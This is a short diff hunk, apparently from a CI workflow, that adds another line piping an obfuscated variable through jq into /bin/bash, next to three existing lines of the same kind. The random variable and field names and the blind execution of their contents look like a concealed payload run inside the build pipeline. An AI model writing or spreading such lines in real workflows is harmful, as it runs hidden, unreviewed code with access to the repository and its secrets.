@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$a41" | jq -r .fx3596 | /bin/bash
           printf '%s' "$q9" | jq -r .riks64792 | /bin/bash
           printf '%s' "$t0449" | jq -r .gwj4 | /bin/bash
+          echo $z7 | jq -r .obmei50 | /bin/bash
 
       - name: Upload data
         if: always()
